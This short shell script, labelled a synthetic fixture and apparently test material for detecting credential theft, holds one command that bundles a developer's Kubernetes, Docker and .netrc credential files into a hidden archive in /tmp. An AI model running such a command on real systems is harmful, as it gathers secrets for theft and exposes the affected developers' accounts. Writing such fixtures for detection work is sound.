#!/bin/sh
# Synthetic fixture: developer credential files collected into an archive.
tar czf /tmp/.c.tgz "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc"
